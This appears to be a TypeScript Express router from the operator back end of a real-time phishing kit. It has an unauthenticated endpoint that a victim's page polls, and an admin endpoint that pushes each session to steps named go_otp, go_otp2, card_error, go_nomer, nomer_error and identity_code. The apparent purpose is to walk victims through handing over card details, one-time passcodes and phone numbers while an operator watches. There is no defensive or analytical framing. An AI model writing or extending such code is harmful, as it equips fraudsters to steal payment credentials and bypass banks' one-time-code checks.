import { Router, type IRouter } from "express";
import { setControl, getControl, type ControlAction } from "../lib/control-store";
import { extractToken, validateToken } from "../lib/auth";

const router: IRouter = Router();

function requireAuth(
  req: import("express").Request,
  res: import("express").Response,
  next: import("express").NextFunction,
): void {
  const token = extractToken(req.headers.authorization);
  if (!token || !validateToken(token)) {
    res.status(401).json({ error: "Unauthorized" });
    return;
  }
  next();
}

router.get("/control/:sessionId", (req, res): void => {
  const raw = req.params.sessionId;
  const sessionId = Array.isArray(raw) ? raw[0] : raw;
  const result = getControl(sessionId);
  if (!result) {
    res.json({ action: null });
    return;
  }
  res.json({ action: result.action, code: result.code });
});

router.post("/admin/control/:sessionId", requireAuth, (req, res): void => {
  const rawSessionId = req.params.sessionId;
  const sessionId = Array.isArray(rawSessionId) ? rawSessionId[0] : rawSessionId;
  const { action, code } = req.body as { action?: string; code?: string };

  const allowed: ControlAction[] = ["go_otp", "go_otp2", "card_error", "go_nomer", "nomer_error", "identity_code"];
  if (!action || !allowed.includes(action as ControlAction)) {
    res.status(400).json({ error: "Invalid action. Must be: go_otp | go_otp2 | card_error | go_nomer | nomer_error | identity_code" });
    return;
  }

  setControl(sessionId, action as ControlAction, code);
  res.json({ success: true, sessionId, action, code });
});

export default router;
